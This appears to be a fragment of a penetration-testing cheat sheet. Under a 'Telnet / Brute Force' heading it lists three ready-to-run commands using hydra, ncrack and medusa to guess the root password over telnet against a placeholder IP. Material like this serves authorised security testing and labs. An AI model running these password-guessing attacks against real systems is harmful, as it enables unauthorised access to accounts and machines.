## Telnet

### Brute Force

    hydra -l root -P passwords.txt [-t 32] <IP> telnet
    ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
    medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
    
    
